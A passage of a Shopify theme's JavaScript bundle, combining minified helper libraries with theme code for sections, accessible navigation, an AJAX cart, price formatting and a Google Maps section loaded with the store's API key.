/*!
 * enquire.js v2.1.2 - Awesome Media Queries in JavaScript
 * Copyright (c) 2014 Nick Williams - http://wicky.nillia.ms/enquire.js
 * License: MIT (http://www.opensource.org/licenses/mit-license.php)
 */
!function(a,b,c){var d=window.matchMedia;"undefined"!=typeof module&&module.exports?module.exports=c(d):"function"==typeof define&&define.amd?define(function(){return b[a]=c(d)}):b[a]=c(d)}("enquire",this,function(a){"use strict";function b(a,b){var c,d=0,e=a.length;for(d;e>d&&(c=b(a[d],d),c!==!1);d++);}function c(a){return"[object Array]"===Object.prototype.toString.apply(a)}function d(a){return"function"==typeof a}function e(a){this.options=a,!a.deferSetup&&this.setup()}function f(b,c){this.query=b,this.isUnconditional=c,this.handlers=[],this.mql=a(b);var d=this;this.listener=function(a){d.mql=a,d.assess()},this.mql.addListener(this.listener)}function g(){if(!a)throw new Error("matchMedia not present, legacy browsers require a polyfill");this.queries={},this.browserIsIncapable=!a("only all").matches}return e.prototype={setup:function(){this.options.setup&&this.options.setup(),this.initialised=!0},on:function(){!this.initialised&&this.setup(),this.options.match&&this.options.match()},off:function(){this.options.unmatch&&this.options.unmatch()},destroy:function(){this.options.destroy?this.options.destroy():this.off()},equals:function(a){return this.options===a||this.options.match===a}},f.prototype={addHandler:function(a){var b=new e(a);this.handlers.push(b),this.matches()&&b.on()},removeHandler:function(a){var c=this.handlers;b(c,function(b,d){return b.equals(a)?(b.destroy(),!c.splice(d,1)):void 0})},matches:function(){return this.mql.matches||this.isUnconditional},clear:function(){b(this.handlers,function(a){a.destroy()}),this.mql.removeListener(this.listener),this.handlers.length=0},assess:function(){var a=this.matches()?"on":"off";b(this.handlers,function(b){b[a]()})}},g.prototype={register:function(a,e,g){var h=this.queries,i=g&&this.browserIsIncapable;return h[a]||(h[a]=new f(a,i)),d(e)&&(e={match:e}),c(e)||(e=[e]),b(e,function(b){d(b)&&(b={match:b}),h[a].addHandler(b)}),this},unregister:function(a,b){var c=this.queries[a];return c&&(b?c.removeHandler(b):(c.clear(),delete this.queries[a])),this}},new g});

/* Simple jQuery Equal Heights @version 1.5.1. Copyright (c) 2013 Matt Banks. Dual licensed under the MIT and GPL licenses. */
!function(a){a.fn.equalHeights=function(){var b=0,c=a(this);return c.each(function(){var c=a(this).innerHeight();c>b&&(b=c)}),c.css("height",b)},a("[data-equal]").each(function(){var b=a(this),c=b.data("equal");b.find(c).equalHeights()})}(jQuery);

/* Run function after window resize */
var afterResize=(function(){var t={};return function(callback,ms,uniqueId){if(!uniqueId){uniqueId="Don't call this twice without a uniqueId";}if(t[uniqueId]){clearTimeout(t[uniqueId]);}t[uniqueId]=setTimeout(callback,ms);};})();

//* Ajaxify.js.liquid *//



/* ================ SLATE ================ */
window.theme = window.theme || {};

theme.Sections = function Sections() {
  this.constructors = {};
  this.instances = [];

  $(document)
    .on('shopify:section:load', this._onSectionLoad.bind(this))
    .on('shopify:section:unload', this._onSectionUnload.bind(this))
    .on('shopify:section:select', this._onSelect.bind(this))
    .on('shopify:section:deselect', this._onDeselect.bind(this))
    .on('shopify:block:select', this._onBlockSelect.bind(this))
    .on('shopify:block:deselect', this._onBlockDeselect.bind(this));
};

theme.Sections.prototype = _.assignIn({}, theme.Sections.prototype, {
  _createInstance: function(container, constructor) {
    var $container = $(container);
    var id = $container.attr('data-section-id');
    var type = $container.attr('data-section-type');

    constructor = constructor || this.constructors[type];

    if (_.isUndefined(constructor)) {
      return;
    }

    var instance = _.assignIn(new constructor(container), {
      id: id,
      type: type,
      container: container
    });

    this.instances.push(instance);
  },

  _onSectionLoad: function(evt) {
    var container = $('[data-section-id]', evt.target)[0];
    if (container) {
      this._createInstance(container);
    }
  },

  _onSectionUnload: function(evt) {
    this.instances = _.filter(this.instances, function(instance) {
      var isEventInstance = instance.id === evt.detail.sectionId;

      if (isEventInstance) {
        if (_.isFunction(instance.onUnload)) {
          instance.onUnload(evt);
        }
      }

      return !isEventInstance;
    });
  },

  _onSelect: function(evt) {
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance) {
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onSelect)) {
      instance.onSelect(evt);
    }
  },

  _onDeselect: function(evt) {
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance) {
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onDeselect)) {
      instance.onDeselect(evt);
    }
  },

  _onBlockSelect: function(evt) {
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance) {
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onBlockSelect)) {
      instance.onBlockSelect(evt);
    }
  },

  _onBlockDeselect: function(evt) {
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance) {
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onBlockDeselect)) {
      instance.onBlockDeselect(evt);
    }
  },

  register: function(type, constructor) {
    this.constructors[type] = constructor;

    $('[data-section-type=' + type + ']').each(
      function(index, container) {
        this._createInstance(container, constructor);
      }.bind(this)
    );
  }
});

/**
 * A11y Helpers
 * -----------------------------------------------------------------------------
 * A collection of useful functions that help make your theme more accessible
 * to users with visual impairments.
 */

theme.a11y = {
  /**
   * For use when focus shifts to a container rather than a link
   * eg for In-page links, after scroll, focus shifts to content area so that
   * next `tab` is where user expects if focusing a link, just $link.focus();
   *
   * @param {JQuery} $element - The element to be acted upon
   */
  pageLinkFocus: function($element) {
    var focusClass = 'js-focus-hidden';

    $element
      .first()
      .attr('tabIndex', '-1')
      .focus()
      .addClass(focusClass)
      .one('blur', callback);

    function callback() {
      $element
        .first()
        .removeClass(focusClass)
        .removeAttr('tabindex');
    }
  },

  /**
   * If there's a hash in the url, focus the appropriate element
   */
  focusHash: function() {
    var hash = window.location.hash;

    // is there a hash in the url? is it an element on the page?
    if (hash && document.getElementById(hash.slice(1))) {
      this.pageLinkFocus($(hash));
    }
  },

  /**
   * When an in-page (url w/hash) link is clicked, focus the appropriate element
   */
  bindInPageLinks: function() {
    $('a[href*=#]').on(
      'click',
      function(evt) {
        this.pageLinkFocus($(evt.currentTarget.hash));
      }.bind(this)
    );
  },

  /**
   * Traps the focus in a particular container
   *
   * @param {object} options - Options to be used
   * @param {jQuery} options.$container - Container to trap focus within
   * @param {jQuery} options.$elementToFocus - Element to be focused when focus leaves container
   * @param {string} options.namespace - Namespace used for new focus event handler
   */
  trapFocus: function(options) {
    var eventName = options.namespace
      ? 'focusin.' + options.namespace
      : 'focusin';

    if (!options.$elementToFocus) {
      options.$elementToFocus = options.$container;
    }

    options.$container.attr('tabindex', '-1');
    options.$elementToFocus.focus();

    $(document).on(eventName, function(evt) {
      if (
        options.$container[0] !== evt.target &&
        !options.$container.has(evt.target).length
      ) {
        options.$container.focus();
      }
    });
  },

  /**
   * Removes the trap of focus in a particular container
   *
   * @param {object} options - Options to be used
   * @param {jQuery} options.$container - Container to trap focus within
   * @param {string} options.namespace - Namespace used for new focus event handler
   */
  removeTrapFocus: function(options) {
    var eventName = options.namespace
      ? 'focusin.' + options.namespace
      : 'focusin';

    if (options.$container && options.$container.length) {
      options.$container.removeAttr('tabindex');
    }

    $(document).off(eventName);
  }
};


/* ================ MODULES ================ */
/* eslint-disable no-new */
window.timber = window.timber || {};

timber.cacheSelectors = function () {
  timber.cache = {
    // General
    $html: $('html'),
    $body: $('body'),
    $window: $(window),
    $breadcrumbs: $('.breadcrumb'),

    // Navigation
    $navigation: $('#AccessibleNav'),
    $mobileNav: $('#MobileNav'),
    $hasDropdownItem: $('.site-nav--has-dropdown'),
    $menuToggle: $('.menu-toggle'),

    // Product Page
    $productImageWrap: $('#productPhoto'),
    $productImage: $('#productPhotoImg'),
    $thumbImages: $('#productThumbs').find('a.product-photo-thumb'),
    $shareButtons: $('.social-sharing'),

    // Collection Pages
    $collectionFilters: $('#collectionFilters'),
    $advancedFilters: $('.advanced-filters'),
    $toggleFilterBtn: $('#toggleFilters'),

    // Cart Pages
    $emptyCart: $('#EmptyCart'),
    $ajaxCartContainer: $('#ajaxifyCart'),
    cartNoCookies: 'cart--no-cookies',

    // Equal height elements
    $featuredBoxImages: $('.featured-box--inner'),
    $featuredBoxTitles: $('.featured-box--title')
  };
};

timber.cacheVariables = function () {
  timber.vars = {
    // Breakpoints (from timber.scss.liquid)
    bpLarge: 769,

    // MediaQueries (from timber.scss.liquid)
    mediaQueryLarge: 'screen and (min-width: 769px)',
    isLargeBp: false,
    isTouch: timber.cache.$html.hasClass('supports-touch')
  }
};

timber.init = function () {
  timber.cacheSelectors();
  timber.cacheVariables();

  timber.cache.$html.removeClass('no-js').addClass('js');
  if ('ontouchstart' in window) {
    timber.cache.$html.removeClass('no-touch').addClass('touch');
  }

  timber.initCart();
  // timber.equalHeights();
  timber.responsiveVideos();
  timber.toggleFilters();

  
};

timber.mobileNav = function () {
  var classes = {
    active: 'nav-active',
    dropdownButton: 'mobile-nav--button'
  }

  var selectors = {
    parentLink: '[data-meganav-type="parent"]',
    dropdownButton: '.' + classes.dropdownButton
  }

  var $mobileNav = timber.cache.$mobileNav,
    $mobileNavBtn = $mobileNav.find(selectors.dropdownButton);

  $mobileNavBtn.on('click', function (evt) {
    var $el = $(this);
    var $parentLink = $el.closest('li');

    if (!$el.hasClass(classes.active)) {
      showDropdown($el, $parentLink);
      return;
    }

    if ($el.hasClass(classes.active)) {
      hideDropdowns($el, $parentLink);
      return;
    }
  });

  function showDropdown($el, $dropdown) {
    $el.addClass(classes.active)
    var $parent = $dropdown.find('> ' + selectors.parentLink);

    $dropdown.addClass(classes.active);
    $el.attr('aria-expanded', 'true');
  }

  function hideDropdowns($el, $parentLink) {
    $el.removeClass(classes.active)
    $parentLink.removeClass(classes.active)

    $.each($parentLink, function () {
      var $dropdown = $(this),
        $parent = $dropdown.find('> ' + selectors.parentLink);
      $dropdown.removeClass(classes.active);
      $el.attr('aria-expanded', 'false');
    })
  }
}

timber.accessibleNav = function () {

  var classes = {
    active: 'nav-hover',
    focus: 'nav-focus',
    outside: 'nav-outside',
    hasDropdown: 'site-nav--has-dropdown',
    link: 'site-nav--link'
  }
  var selectors = {
    active: '.' + classes.active,
    hasDropdown: '.' + classes.hasDropdown,
    dropdown: '[data-meganav-dropdown]',
    link: '.' + classes.link,
    nextLink: '> .' + classes.link,
    parentLink: '[data-meganav-type="parent"]',
    childLink: '[data-meganav-type="child"]'
  }

  var $nav = timber.cache.$navigation,
    $allLinks = $nav.find(selectors.link),
    $parents = $nav.find(selectors.hasDropdown),
    $childLinks = $nav.find(selectors.childLink),
    $topLevel = $parents.find(selectors.nextLink),
    $dropdowns = $nav.find(selectors.dropdown),
    $subMenuLinks = $dropdowns.find(selectors.link);

  // Mouseenter
  $parents.on('mouseenter touchstart', function (evt) {

    var $el = $(this);
    var evtType = evt.type;
    var $dropdowns = $nav.find(selectors.active);

    if (!$el.hasClass(classes.active)) {
      // force stop the click from happening
      evt.preventDefault();
      evt.stopImmediatePropagation();
    }

    // Make sure we close any opened same level dropdown before opening a new one
    if (evtType === 'touchstart' && $dropdowns.length > 0) { hideDropdown($el); }

    showDropdown($el);

  });

  $childLinks.on('touchstart', function (evt) {
    evt.stopImmediatePropagation();
  });

  $parents.on('mouseleave', function () {
    hideDropdown($(this));
  });

  $allLinks.on('focus', function () {
    handleFocus($(this));
  })

  $allLinks.on('blur', function () {
    removeFocus($topLevel);
  })

  // accessibleNav private methods
  function handleFocus($el) {
    var $newFocus = null,
      $previousItem = $el.parent().prev();

    // Always put tabindex -1 on previous element just in case the user is going backward.
    // In that case, we want to focus on the previous parent and not the previous parent childs

    $allLinks.attr('tabindex', '');

    if ($previousItem.hasClass(classes.hasDropdown)) {
      $previousItem.find(selectors.dropdown + ' ' + selectors.link).attr('tabindex', -1);
    }

    $newFocus = $el.parents(selectors.hasDropdown).find('> ' + selectors.link);
    addFocus($newFocus);

  }

  function showDropdown($el) {
    var $toplevel = $el.find(selectors.nextLink);

    $toplevel.attr('aria-expanded', true);

    $el.addClass(classes.active);

    setTimeout(function () {
      timber.cache.$body.on('touchstart.MegaNav', function () {
        hideDropdowns();
      });
    }, 250);
  }

  function hideDropdown($el) {
    var $dropdowns = $el.parent().find(selectors.active);
    var $parentLink = $dropdowns.find(selectors.nextLink);

    $parentLink.attr('aria-expanded', false);

    $dropdowns.removeClass(classes.active);

    timber.cache.$body.off('touchstart.MegaNav');
  }

  function hideDropdowns() {
    var $dropdowns = $nav.find(selectors.active);
    $.each($dropdowns, function () {
      hideDropdown($(this));
    });
  }

  function addFocus($el) {
    $el.addClass(classes.focus);

    if ($el.attr('aria-expanded') !== undefined) {
      $el.attr('aria-expanded', true);
    }
  }

  function removeFocus($el) {
    $el.removeClass(classes.focus);

    $subMenuLinks.attr('tabindex', -1);

    if ($el.attr('aria-expanded') !== undefined) {
      $el.attr('aria-expanded', false);
    }
  }

  // Check if dropdown is outside of viewport
  function handleDropdownOffset($dropdowns) {
    var viewportSize = $(window).width();
    $dropdowns.removeClass(classes.outside);

    $.each($dropdowns, function () {
      $dropdown = $(this);
      var dropdownOffset = $dropdown.offset().left + $dropdown.width();
      if (dropdownOffset > viewportSize) {
        $dropdown.addClass(classes.outside);
      }
    });
  }

  timber.cache.$window.load(function () {
    handleDropdownOffset($dropdowns);
  });

  timber.cache.$window.resize(function () {
    afterResize(function () {
      handleDropdownOffset($dropdowns);
    }, 250);
  });
};

timber.responsiveNav = function () {
  $(window).resize(function () {
    afterResize(function () {
      // Replace original nav items and remove more link
      timber.cache.$navigation.append($('#moreMenu--list').html());
      $('#moreMenu').remove();
      timber.alignMenu();
      timber.accessibleNav();
    }, 200, 'uniqueID');
  });
  timber.alignMenu();
  timber.accessibleNav();
  timber.mobileNav();
};

timber.alignMenu = function () {
  var $nav = timber.cache.$navigation,
    w = 0,
    i = 0;
  wrapperWidth = $nav.outerWidth() - 101,
    menuhtml = '';

  if (window.innerWidth < timber.vars.bpLarge) {
    return;
  }

  $.each($nav.children(), function () {
    var $el = $(this);

    // Ignore hidden customer links (for mobile)
    if (!$el.hasClass('large-hide')) {
      w += $el.outerWidth(true);
    }

    if (wrapperWidth < w) {
      menuhtml += $('<div>').append($el.clone()).html();
      $el.remove();

      // Ignore hidden customer links (for mobile)
      if (!$el.hasClass('large-hide')) {
        i++;
      }
    }
  });

  if (wrapperWidth < w) {
    $nav.append(
      '<li id="moreMenu" class="site-nav--has-dropdown">'
      + '<button style="font-size: inherit;!important" class="site-nav--link" data-meganav-type="parent" aria-expanded="false">' + theme.strings.navigation.more_link + '<span class="icon icon-arrow-down" aria-hidden="true"></span></button>'
      + '<ul id="moreMenu--list" class="site-nav--dropdown site-nav--has-grandchildren site-nav--dropdown--more">' + menuhtml + '</ul></li>'
    );

    $('#moreMenu').find('a').attr('tabindex', '-1');

    if (i <= 1) {
      // Bail, and replace original nav items
      timber.cache.$navigation.append($('#moreMenu--list').html());
      $('#moreMenu').remove();
    }
  }
};

timber.toggleMenu = function () {
  var $mainHeader = $('#shopify-section-header');
  var $navBar = $('#navBar');
  var $siteHeader = $mainHeader.find('.site-header');
  var showNavClass = 'show-nav';
  var hiddenClass = 'site-header--hidden';

  timber.cache.$menuToggle.on('click', function () {
    var $el = $(this),
    isExpanded = ($el.attr('aria-expanded') === 'true');

    timber.cache.$html.toggleClass(showNavClass);

    $el.attr('aria-expanded', !isExpanded);

    if (!isExpanded) {
      setTimeout(function () {
        $siteHeader.addClass(hiddenClass);
      }, 450); // Match CSS transition speed
      theme.a11y.trapFocus({
        $container: $mainHeader,
        $elementToFocus: $('#MobileNav > li:first-child a'),
        namespace: 'mobileMenuToggle'
      });
       $navBar.scrollTop(0);
    } else {
      $siteHeader.removeClass(hiddenClass);
      theme.a11y.removeTrapFocus({
        $container: $mainHeader,
        namespace: 'mobileMenuToggle'
      });
    }

    // Close ajax cart if open (keep selectors live, modal is inserted with JS)
    if ($('#ajaxifyModal').hasClass('is-visible')) {
      $('#ajaxifyModal').removeClass('is-visible');
      timber.cache.$html.addClass(showNavClass);
    }
  });
};

timber.initCart = function() {
  if (theme.settings.cartType != 'page'){
    ajaxifyShopify.init({
      method: theme.settings.cartType,
      wrapperClass: 'wrapper',
      formSelector: '[data-product-form]',
      addToCartSelector: '#addToCart',
      cartCountSelector: '.cart-count',
      toggleCartButton: '.cart-toggle',
      useCartTemplate: true,
      btnClass: 'btn',
      moneyFormat: moneyFormat,
      disableAjaxCart: false,
      enableQtySelectors: true
    });
  }

  if (!timber.cookiesEnabled()) {
    timber.cache.$emptyCart.addClass(timber.cache.cartNoCookies);
    timber.cache.$ajaxCartContainer.addClass(timber.cache.cartNoCookies);
  }
};

timber.cookiesEnabled = function () {
  var cookieEnabled = navigator.cookieEnabled;

  if (!cookieEnabled) {
    document.cookie = 'testcookie';
    cookieEnabled = (document.cookie.indexOf('testcookie') !== -1);
  }
  return cookieEnabled;
};

timber.equalHeights = function (el) {
  $(window).load(function () {
    timber.resizeElements(this);
  });

  $(window).resize(function (el) {
    afterResize(function () {
      timber.resizeElements(this);
    }, 250, 'id');
  });

  timber.resizeElements(this);
};

timber.resizeElements = function ($container, id) {
  var $id = $container.attr('data-section-id', id);
  var $grid = $container.find('.grid-uniform');
  var $gridImages = $id.find('.product-grid-image');

  $gridImages.css('height', 'auto').equalHeights(this);

  var $featuredBoxImages = $container.find('.featured-box--inner');
  var $featuredBoxTitles = $container.find('.featured-box--title');

  $featuredBoxImages.css('height', 'auto').equalHeights(this);
  $featuredBoxTitles.css('height', 'auto').equalHeights(this);
};

timber.responsiveVideos = function () {
  var $iframeVideo = $('iframe[src*="youtube.com/embed"], iframe[src*="player.vimeo"]');
  var $iframeReset = $iframeVideo.add('iframe#admin_bar_iframe');

  $iframeVideo.each(function () {
    // Add wrapper to make video responsive but not for video sections
    if (!$(this).parent('div.video-wrapper').length) {
      $(this).wrap('<div class="video-wrapper"></div>');
    };
  });

  $iframeReset.each(function () {
    // Re-set the src attribute on each iframe after page load
    // for Chrome's 'incorrect iFrame content on 'back'' bug.
    // https://code.google.com/p/chromium/issues/detail?id=395791
    // Need to specifically target video and admin bar
    this.src = this.src;
  });
};

timber.toggleFilters = function () {
  if (timber.cache.$collectionFilters.length) {
    timber.cache.$toggleFilterBtn.on('click', function () {
      timber.cache.$toggleFilterBtn.toggleClass('is-active');
      timber.cache.$collectionFilters.slideToggle(200);

      // Scroll to top of filters if user is down the page a bit
      if ($(window).scrollTop() > timber.cache.$breadcrumbs.offset().top) {
        $('html, body').animate({
          scrollTop: timber.cache.$breadcrumbs.offset().top
        });
      }
    });
  }
};

timber.sortFilters = function () {
  timber.cache.$advancedFilters.each(function () {
    var $el = $(this),
      $tags = $el.find('li'),
      aNumber = /\d+/,
      sorted = false;
    $tags.sort(function (a, b) {
      a = parseInt(aNumber.exec($(a).text()), 10);
      b = parseInt(aNumber.exec($(b).text()), 10);
      if (isNaN(a) || isNaN(b)) {
        return;
      }
      else {
        sorted = true;
        return a - b;
      }
    });
    if (sorted) {
      $el.append($tags);
    }
  });
};

timber.formatMoney = function (val) {

  

  
  if (moneyFormat.indexOf('money') === -1) {
    if ((moneyFormat.indexOf('{{amount}}') > -1) && (moneyFormat.indexOf('.') === -1) ) {
    val = val.replace('.', '<sup>') + '</sup>';
  }
      else if ((moneyFormat.indexOf('{{ amount }}') > -1) && (moneyFormat.indexOf('.') === -1) ) {
  val = val.replace('.', '<sup>') + '</sup>';
}
      else if (moneyFormat.indexOf('{{ amount_with_comma_separator }}') > -1) {
  val = val.replace(',', '<sup>') + '</sup>';
}
else if (moneyFormat.indexOf('{{amount_with_comma_separator}}') > -1) {
  val = val.replace(',', '<sup>') + '</sup>';
}
    }


return val;
};

timber.formatSaleTag = function (val) {
  // If not using multiple currencies
  if (moneyFormat.indexOf('money') === -1) {
    // If we use amount
    if ( (moneyFormat.replace(/\s/g, '').indexOf('{{amount}}') > -1) && (moneyFormat.indexOf('.') === -1) ) {
      // If there are no cents, remove decimals
      if ( val.indexOf('.00') > -1 ) {
        return val.replace('.00', '')
      }
    }
    // If we use amount_with_comma_separator
    else if (moneyFormat.replace(/\s/g, '').indexOf('{{amount_with_comma_separator}}') > -1) {
      // If there are no cents, remove decimals
      if ( val.indexOf(',00') > -1 ) {
        return val.replace(',00', '')
      }
    }
  }
  return val;
};

// Initialize Timber's JS on docready
$(timber.init)

/*!
 * imagesLoaded PACKAGED v4.1.1
 * JavaScript is all like "You images are done yet or what?"
 * MIT License
 */

!function(t,e){"function"==typeof define&&define.amd?define("ev-emitter/ev-emitter",e):"object"==typeof module&&module.exports?module.exports=e():t.EvEmitter=e()}("undefined"!=typeof window?window:this,function(){function t(){}var e=t.prototype;return e.on=function(t,e){if(t&&e){var i=this._events=this._events||{},n=i[t]=i[t]||[];return-1==n.indexOf(e)&&n.push(e),this}},e.once=function(t,e){if(t&&e){this.on(t,e);var i=this._onceEvents=this._onceEvents||{},n=i[t]=i[t]||{};return n[e]=!0,this}},e.off=function(t,e){var i=this._events&&this._events[t];if(i&&i.length){var n=i.indexOf(e);return-1!=n&&i.splice(n,1),this}},e.emitEvent=function(t,e){var i=this._events&&this._events[t];if(i&&i.length){var n=0,o=i[n];e=e||[];for(var r=this._onceEvents&&this._onceEvents[t];o;){var s=r&&r[o];s&&(this.off(t,o),delete r[o]),o.apply(this,e),n+=s?0:1,o=i[n]}return this}},t}),function(t,e){"use strict";"function"==typeof define&&define.amd?define(["ev-emitter/ev-emitter"],function(i){return e(t,i)}):"object"==typeof module&&module.exports?module.exports=e(t,require("ev-emitter")):t.imagesLoaded=e(t,t.EvEmitter)}(window,function(t,e){function i(t,e){for(var i in e)t[i]=e[i];return t}function n(t){var e=[];if(Array.isArray(t))e=t;else if("number"==typeof t.length)for(var i=0;i<t.length;i++)e.push(t[i]);else e.push(t);return e}function o(t,e,r){return this instanceof o?("string"==typeof t&&(t=document.querySelectorAll(t)),this.elements=n(t),this.options=i({},this.options),"function"==typeof e?r=e:i(this.options,e),r&&this.on("always",r),this.getImages(),h&&(this.jqDeferred=new h.Deferred),void setTimeout(function(){this.check()}.bind(this))):new o(t,e,r)}function r(t){this.img=t}function s(t,e){this.url=t,this.element=e,this.img=new Image}var h=t.jQuery,a=t.console;o.prototype=Object.create(e.prototype),o.prototype.options={},o.prototype.getImages=function(){this.images=[],this.elements.forEach(this.addElementImages,this)},o.prototype.addElementImages=function(t){"IMG"==t.nodeName&&this.addImage(t),this.options.background===!0&&this.addElementBackgroundImages(t);var e=t.nodeType;if(e&&d[e]){for(var i=t.querySelectorAll("img"),n=0;n<i.length;n++){var o=i[n];this.addImage(o)}if("string"==typeof this.options.background){var r=t.querySelectorAll(this.options.background);for(n=0;n<r.length;n++){var s=r[n];this.addElementBackgroundImages(s)}}}};var d={1:!0,9:!0,11:!0};return o.prototype.addElementBackgroundImages=function(t){var e=getComputedStyle(t);if(e)for(var i=/url\((['"])?(.*?)\1\)/gi,n=i.exec(e.backgroundImage);null!==n;){var o=n&&n[2];o&&this.addBackground(o,t),n=i.exec(e.backgroundImage)}},o.prototype.addImage=function(t){var e=new r(t);this.images.push(e)},o.prototype.addBackground=function(t,e){var i=new s(t,e);this.images.push(i)},o.prototype.check=function(){function t(t,i,n){setTimeout(function(){e.progress(t,i,n)})}var e=this;return this.progressedCount=0,this.hasAnyBroken=!1,this.images.length?void this.images.forEach(function(e){e.once("progress",t),e.check()}):void this.complete()},o.prototype.progress=function(t,e,i){this.progressedCount++,this.hasAnyBroken=this.hasAnyBroken||!t.isLoaded,this.emitEvent("progress",[this,t,e]),this.jqDeferred&&this.jqDeferred.notify&&this.jqDeferred.notify(this,t),this.progressedCount==this.images.length&&this.complete(),this.options.debug&&a&&a.log("progress: "+i,t,e)},o.prototype.complete=function(){var t=this.hasAnyBroken?"fail":"done";if(this.isComplete=!0,this.emitEvent(t,[this]),this.emitEvent("always",[this]),this.jqDeferred){var e=this.hasAnyBroken?"reject":"resolve";this.jqDeferred[e](this)}},r.prototype=Object.create(e.prototype),r.prototype.check=function(){var t=this.getIsImageComplete();return t?void this.confirm(0!==this.img.naturalWidth,"naturalWidth"):(this.proxyImage=new Image,this.proxyImage.addEventListener("load",this),this.proxyImage.addEventListener("error",this),this.img.addEventListener("load",this),this.img.addEventListener("error",this),void(this.proxyImage.src=this.img.src))},r.prototype.getIsImageComplete=function(){return this.img.complete&&void 0!==this.img.naturalWidth},r.prototype.confirm=function(t,e){this.isLoaded=t,this.emitEvent("progress",[this,this.img,e])},r.prototype.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},r.prototype.onload=function(){this.confirm(!0,"onload"),this.unbindEvents()},r.prototype.onerror=function(){this.confirm(!1,"onerror"),this.unbindEvents()},r.prototype.unbindEvents=function(){this.proxyImage.removeEventListener("load",this),this.proxyImage.removeEventListener("error",this),this.img.removeEventListener("load",this),this.img.removeEventListener("error",this)},s.prototype=Object.create(r.prototype),s.prototype.check=function(){this.img.addEventListener("load",this),this.img.addEventListener("error",this),this.img.src=this.url;var t=this.getIsImageComplete();t&&(this.confirm(0!==this.img.naturalWidth,"naturalWidth"),this.unbindEvents())},s.prototype.unbindEvents=function(){this.img.removeEventListener("load",this),this.img.removeEventListener("error",this)},s.prototype.confirm=function(t,e){this.isLoaded=t,this.emitEvent("progress",[this,this.element,e])},o.makeJQueryPlugin=function(e){e=e||t.jQuery,e&&(h=e,h.fn.imagesLoaded=function(t,e){var i=new o(this,t,e);return i.jqDeferred.promise(h(this))})},o.makeJQueryPlugin(),o});


/* ================ SECTIONS ================ */
window.theme = window.theme || {};

theme.FeaturedCollections = (function() {
  function FeaturedCollections(container) {
    var $container = (this.$container = $(container));
    timber.cacheSelectors();
    timber.resizeElements($container);

    $(window).resize(function() {
      timber.resizeElements($container);
    });
  }

  return FeaturedCollections;
})();

window.theme = window.theme || {};

theme.CollectionRows = (function() {
  function CollectionRows(container) {
    var $container = (this.$container = $(container));
    var id = (this.id = $container.attr('data-section-id'));
    timber.cacheSelectors();
    timber.resizeElements($container, id);
    $(window).resize(function() {
      timber.resizeElements($container, id);
    });
  }

  return CollectionRows;
})();

window.theme = window.theme || {};

theme.Collection = (function() {
  function Collection(container) {
    var $container = (this.$container = $(container));
    var id = (this.id = $container.attr('data-section-id'));
    timber.cacheSelectors();
    timber.resizeElements($container, id);
    $(window).resize(function() {
      timber.resizeElements($container, id);
    });
  }

  return Collection;
})();

window.theme = window.theme || {};

theme.HeaderSection = (function() {
  function Header() {
    timber.cacheSelectors();
    timber.toggleMenu();

    $(window)
      .on('load', timber.responsiveNav)
      .resize();
  }

  return Header;
})();

window.theme = window.theme || {};

theme.ListCollections = (function() {
  function ListCollections(container) {
    var $container = (this.$container = $(container));
    timber.cacheSelectors();
    timber.resizeElements($container);

    $(window).resize(function() {
      timber.resizeElements($container);
    });
  }

  return ListCollections;
})();

theme.Maps = (function() {
  var config = {
    zoom: 14
  };
  var apiStatus = null;
  var mapsToLoad = [];

  function Map(container) {
    theme.$currentMapContainer = this.$container = $(container);
    var key = this.$container.data('api-key');

    if (typeof key !== 'string' || key === '') {
      return;
    }

    if (apiStatus === 'loaded') {
      var self = this;

      // Check if the script has previously been loaded with this key
      var $script = $('script[src*="' + key + '&"]');
      if ($script.length === 0) {
        $.getScript('https://maps.googleapis.com/maps/api/js?key=' + key).then(
          function() {
            apiStatus = 'loaded';
            self.createMap();
          }
        );
      } else {
        this.createMap();
      }
    } else {
      mapsToLoad.push(this);

      if (apiStatus !== 'loading') {
        apiStatus = 'loading';
        if (typeof window.google === 'undefined') {
          $.getScript(
            'https://maps.googleapis.com/maps/api/js?key=' + key
          ).then(function() {
            apiStatus = 'loaded';
            initAllMaps();
          });
        }
      }
    }
  }

  function initAllMaps() {
    // API has loaded, load all Map instances in queue
    $.each(mapsToLoad, function(index, instance) {
      instance.createMap();
    });
  }

  function geolocate($map) {
    var deferred = $.Deferred();
    var geocoder = new google.maps.Geocoder();
    var address = $map.data('address-setting');

    geocoder.geocode({ address: address }, function(results, status) {
      if (status !== google.maps.GeocoderStatus.OK) {
        deferred.reject(status);
      }

      deferred.resolve(results);
    });

    return deferred;
  }

  Map.prototype = _.assignIn({}, Map.prototype, {
    createMap: function() {
      var $map = this.$container.find('.map-section__container');

      return geolocate($map)
        .then(
          function(results) {
            var mapOptions = {
              zoom: config.zoom,
              styles: config.styles,
              center: results[0].geometry.location,
              draggable: false,
              clickableIcons: false,
              scrollwheel: false,
              disableDoubleClickZoom: true,
              disableDefaultUI: true
            };

            var map = (this.map = new google.maps.Map($map[0], mapOptions));
            var center = (this.center = map.getCenter());

            //eslint-disable-next-line no-unused-vars
            var marker = new google.maps.Marker({
              map: map,
              position: center
            });

            google.maps.event.addDomListener(window, 'resize', function() {
              google.maps.event.trigger(map, 'resize');
              map.setCenter(center);
            });
          }.bind(this)
        )
        .fail(function() {
          var errorMessage;

          switch (status) {
            case 'ZERO_RESULTS':
              errorMessage = theme.strings.map.addressNoResults;
              break;
            case 'OVER_QUERY_LIMIT':
              errorMessage = theme.strings.map.addressQueryLimit;
              break;
            default:
              errorMessage = theme.strings.map.addressError;
              break;
          }

          // Only show error in the theme editor
          if (Shopify.designMode) {
            var $mapContainer = $map.parents('.map-section');

            $mapContainer.addClass('page-width map-section--load-error');
            $mapContainer.find('.map-section__content-wrapper').remove();
            $mapContainer
              .find('.map-section__wrapper')
              .html(
                '<div class="errors text-center" style="width: 100%;">' +
                  errorMessage +
                  '</div>'
              );
          }
        });
    },

    onUnload: function() {
      if (typeof window.google !== 'undefined') {
        google.maps.event.clearListeners(this.map, 'resize');
      }
    }
